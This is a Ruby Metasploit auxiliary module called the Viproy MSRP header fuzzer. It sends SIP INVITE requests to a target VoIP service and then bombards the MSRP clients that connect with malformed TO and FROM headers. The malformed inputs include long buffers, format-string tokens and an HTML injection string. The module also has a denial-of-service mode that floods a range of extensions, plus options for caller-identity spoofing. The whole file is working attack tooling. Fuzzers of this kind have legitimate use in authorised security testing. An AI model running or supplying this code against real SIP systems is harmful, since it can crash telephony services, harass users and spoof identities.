##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'digest/md5'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::SIP
  include Msf::Auxiliary::MSRP
  include Msf::Auxiliary::AuthBrute
  include Msf::Exploit::Remote::TcpServer



  def initialize
    super(
        'Name'        => 'Viproy MSRP Header Fuzzer with SIP Invite Support',
        'Version'     => '1',
        'Description' => 'MSRP Header Fuzzing Module for SIP Services',
        'Author'      => 'fozavci',
        'License'     => 'GPL',
      'PassiveActions' =>
        [
          'Service'
        ],
      'DefaultAction'  => 'Service'
    )

    deregister_options('RHOSTS','USER_AS_PASS','THREADS','DB_ALL_CREDS', 'DB_ALL_USERS', 'DB_ALL_PASS','USERPASS_FILE','PASS_FILE','PASSWORD','BLANK_PASSWORDS', 'BRUTEFORCE_SPEED','STOP_ON_SUCCESS' )

    register_options(
      [
        OptInt.new('NUMERIC_MIN',   [true, 'Starting extension',0]),
        OptInt.new('NUMERIC_MAX',   [true, 'Ending extension', 9999]),
        OptBool.new('NUMERIC_USERS',   [true, 'Numeric Username Bruteforcing', false]),
        OptBool.new('DOS_MODE',   [true, 'Denial of Service Mode', false]),
        OptString.new('USERNAME',   [ true, "The login username to probe at each host", "NOUSER"]),
        OptString.new('PASSWORD',   [ true, "The login password to probe at each host", "password"]),
        OptString.new('TO',   [ true, "The destination number to probe at each host", "1000"]),
        OptString.new('FROM',   [ true, "The source number to probe at each host", "1000"]),
        OptString.new('FROMNAME',   [ false, "Custom Name for Message Spoofing", nil]),
        OptString.new('PROTO',   [ true, "Protocol for SIP service (UDP|TCP|TLS)", "UDP"]),
        OptBool.new('LOGIN', [false, 'Login Before Sending Message', false]),
        OptString.new('MESSAGE_CONTENT',   [ false, "Message Content or a File Path", "Test"]),
        OptString.new('MESSAGE_SUBJECT',   [ false, "Message Subject", "Subject"]),
        OptString.new('MESSAGE_TYPE',   [ false, "Message Content type (text/html, text/plain, application/octet-stream)", 'text/plain']),
        OptString.new('MSRP_TYPE',   [ false, "MSRP Content type (message/cpim, application/octet-stream)", 'message/cpim']),
        OptPort.new('SRVPORT',    [ true, "The local MSRP port to listen on.", 55001 ]),

        Opt::RHOST,
        Opt::RPORT(5060),

      ], self.class)

    register_advanced_options(
      [
        Opt::CHOST,
        Opt::CPORT(5060),
        OptString.new('USERAGENT',   [ false, "SIP user agent" ]),
        OptBool.new('DEBUG',   [ false, "Debug Level", false]),
        OptString.new('REALM',   [ false, "The login realm to probe at each host", nil]),
        OptString.new('LOGINMETHOD', [false, 'Login Method (REGISTER | INVITE)', "INVITE"]),
        OptBool.new('TOEQFROM', [true, 'FROM will be cloned from TO for all users', false]),
        OptString.new('CUSTOMHEADER', [false, 'Custom Headers for Requests', nil]),
        OptString.new('P-Asserted-Identity', [false, 'Proxy Identity Field. Sample: (IVR, 200@192.168.0.1)', nil]),
        OptString.new('Remote-Party-ID', [false, 'Remote Party Identity Field. (IVR, 200@192.168.0.1)', nil]),
        OptString.new('P-Charging-Vector', [false, 'Proxy Charging Field. Sample: icid-value=msanicid;msan-id=msan123;msan-pro=1 ', nil]),
        OptString.new('Record-Route', [false, 'Proxy Record-Route. Sample: <sip:100@RHOST:RPORT;lr>', nil]),
        OptString.new('Route', [false, 'Proxy Route. Sample: <sip:100@RHOST:RPORT;lr>', nil]),
        OptInt.new('DOS_COUNT',   [true, 'Count of Messages for DOS',1]),
        OptString.new('MACADDRESS',   [ false, "MAC Address for Vendor", "000000000000"]),
        OptString.new('VENDOR',   [ true, "Vendor (GENERIC|CISCODEVICE|CISCOGENERIC|MSLYNC)", "GENERIC"]),
        OptString.new('CISCODEVICE',   [ true, "Cisco device type for authentication (585, 7940)", "7940"]),
        OptBool.new('USEREQFROM',   [ false, "FROM will be cloned from USERNAME", true]),

      ], self.class)
  end

  def setup
		super
		@clients={}
		@fuzzingtarget = nil
		@fuzzingstatus = nil
  		@fuzzinginput=["A"*8620, "A"*4150, "A"*1050, "A"*550, "AAAAAAA", "0x!@KKJS", "0x219387129387129378123", "0xFFFFFFFFFFFFFFFFF", "-123123123", '@(#&@(#*@!P"', '\'",%1%u%x', "' ,823 '", "\"')><h1>test"]
		print_status("The service parameters set")
  end

  def run
    # Login Parameters
    login = datastore['LOGIN']
    user = datastore['USERNAME']
    password = datastore['PASSWORD']
    realm = datastore['REALM']

    sockinfo={}
    # Protocol parameters
    sockinfo["proto"] = datastore['PROTO'].downcase
    sockinfo["vendor"] = datastore['VENDOR'].downcase
    sockinfo["macaddress"] = datastore['MACADDRESS']

    # Socket parameters
    sockinfo["listen_addr"] = datastore['CHOST']
    sockinfo["listen_port"] = datastore['CPORT']
    sockinfo["dest_addr"] =datastore['RHOST']
    sockinfo["dest_port"] = datastore['RPORT']
    sockinfo["msrp_port"] = datastore['MSRPPORT']

    # Message Content
    case datastore['MESSAGE_CONTENT'] 
      when /FUZZ/
          message = Rex::Text.pattern_create(datastore['MESSAGE_CONTENT'].split(" ")[1].to_i)
      when /^file:\/\//
      m = datastore['MESSAGE_CONTENT']
      message = IO.read(m.split("://")[1])
      messagefilename = m.split("/")[m.length-1]
      else
        message = datastore['MESSAGE_CONTENT'].gsub("\\n","\r\n")
    end

    # Message Content Type
    if datastore['MESSAGE_TYPE'] =~ /FUZZ/
      messagetype = Rex::Text.pattern_create(datastore['MESSAGE_TYPE'].split(" ")[1].to_i)
    else
      messagetype = datastore['MESSAGE_TYPE'] || 'text/plain'
    end

    # Message Subject
    if datastore['MESSAGE_SUBJECT'] =~ /FUZZ/
      messagesubject = Rex::Text.pattern_create(datastore['MESSAGE_SUBJECT'].split(" ")[1].to_i)
    else
      messagesubject = datastore['MESSAGE_SUBJECT'] || 'Subject'
    end

    # MSRP Type
    if datastore['MSRP_TYPE'] =~ /FUZZ/
      	msrptype = Rex::Text.pattern_create(datastore['MSRP_TYPE'].split(" ")[1].to_i)
    else
     	msrptype = datastore['MSRP_TYPE'] || 'text/plain'
    end

    @msg = {
        :msrptype => msrptype, :messagesubject => messagesubject, :messagetype => messagetype,
        :message => message, :messagefilename => messagefilename, :size => message.length
    }

    # Dumb fuzzing for FROM, FROMNAME and TO fields
    if datastore['FROM'] =~ /FUZZ/
      from=Rex::Text.pattern_create(datastore['FROM'].split(" ")[1].to_i)
      fromname=nil
    else
      from = datastore['FROM']
      if datastore['FROMNAME'] =~ /FUZZ/
        fromname=Rex::Text.pattern_create(datastore['FROMNAME'].split(" ")[1].to_i)
      else
        fromname = datastore['FROMNAME'] || datastore['FROM']
      end
    end
    if datastore['TO'] =~ /FUZZ/
      to=Rex::Text.pattern_create(datastore['TO'].split(" ")[1].to_i)
    else
      to = datastore['TO']
    end

    # DOS mode setup
    if datastore['DOS_MODE']
      if datastore['NUMERIC_USERS']
        tos=(datastore['NUMERIC_MIN']..datastore['NUMERIC_MAX']).to_a
      else
        print_error("User file is not defined.")
        return
        #tos=load_user_vars
      end
    else
      tos=[to]
    end

    sipsocket_start(sockinfo)
    sipsocket_connect

    tos.each do |to|
      to.to_s
      if datastore['TOEQFROM']
        from=to
        fromname=nil
      end

	  print_status("Starting the MSRP services")
	  @msrpservice=framework.threads.spawn("MSRPService", false) {
        exploit
      }

	  print_status("Sending the INVITE request with MSRP SDP content")
      datastore['DOS_COUNT'].times do
        results = send_invite(
          'login' 	      => login,
          'loginmethod'  	  => datastore['LOGINMETHOD'].upcase,
          'user'  	      => user,
          'password'	      => password,
          'realm' 	      => realm,
          'from'  	      => from,
          'fromname'  	  => fromname,
          'to'  		      => to,
          'sdp'			  => get_msrp_sdp(sockinfo,@msg),
        )

        if results != nil
          printresults(results) if datastore['DEBUG'] == true and results["rdata"] != nil

          if results["status"] == :succeed
            print_good("Invite is accepted by #{to}")
			      print_good("Received SDP Content: #{results["rdata"]["sdp"].gsub("\r\n","\t\r\n")}")
          else
            print_status("Invite is not accepted by #{to} (Server Response: #{results["rdata"]['resp_msg'].split(" ")[1,5].join(" ")})") if results["rdata"] != nil
          end
        end
      end
    end

    while @msrpservice.alive?
      while @fuzzingtarget.nil?
        Rex::ThreadSafe.sleep(0.5)
      end
      @fuzzingstatus = start_header_fuzzing(@fuzzingtarget,@fuzzingstatus) if @fuzzingstatus.nil?
    end

    @msrpservice.kill
    sipsocket_stop
  end

	# Actions when clients connect
	def on_client_connect(c)
		@clients[c] = {
		  :name          => "#{c.peerhost}:#{c.peerport}",
		  :ip            => c.peerhost,
		  :port          => c.peerport,
		  :heartbeats    => "",
		  :server_random => [Time.now.to_i].pack("N") + Rex::Text.rand_text(28)
		}
		print_status("#{@clients[c][:name]} is connected")
	end

	# Actions when clients send data 
	def on_client_data(c)
		data = c.get_once
		return if not data
		print_status("#{@clients[c][:name]} Data Received:\n#{data.gsub("\r\n","\t\r\n")}")
		@clients[c][:buff] ||= ""
		@clients[c][:buff] << data
		@clients[c][:msrp] ||= {}
		@clients[c] = process_request(@clients,c)
		@fuzzingtarget ||= c
	end


	def start_header_fuzzing(c,fuzzingstatus)

		return "completed" if fuzzingstatus == "completed"

		tohead = @clients[c][:msrp][:to_uri]
		fromhead = @clients[c][:msrp][:from_uri]

		targettofields = [ 
			@clients[c][:msrp][:to_uri].split(":")[0], 
			@clients[c][:msrp][:to_uri].split("/")[2].split(":")[0], 
			@clients[c][:msrp][:to_uri].split("/")[2].split(":")[1], 
			@clients[c][:msrp][:to_uri].split("/")[3].split(";")[0],
			@clients[c][:msrp][:to_uri].split(";")[1]
		]

		targetfromfields = [ 
			@clients[c][:msrp][:from_uri].split(":")[0], 
			@clients[c][:msrp][:from_uri].split("/")[2].split(":")[0], 
			@clients[c][:msrp][:from_uri].split("/")[2].split(":")[1], 
			@clients[c][:msrp][:from_uri].split("/")[3].split(";")[0],
			@clients[c][:msrp][:from_uri].split(";")[1]
		]

		print_status("The MSRP header fuzzing is starting...")
		@fuzzinginput.each {|input|
			targettofields.each {|t|
				newto = tohead.gsub(t,input)
				@msg[:message] = input
				@clients[c][:msrp][:to_uri] = newto
				msrp_content = prep_msrp_content(@clients,c, @msg)
				c.put(msrp_content)
			}
			print_status("TO fields fuzzing is completed.")

			@clients[c][:msrp][:to_uri] = tohead  # recovering the original TO header

			targetfromfields.each {|t|
				newfrom = fromhead.gsub(t,input)
				@msg[:message] = input
				@clients[c][:msrp][:from_uri] = newfrom
				msrp_content = prep_msrp_content(@clients,c,@msg)
				c.put(msrp_content)
			}
			print_status("FROM fields fuzzing is completed.")
		
		}
		print_status("The MSRP header fuzzing is completed.")

		fuzzingstatus = "completed"

		return fuzzingstatus
	end

end

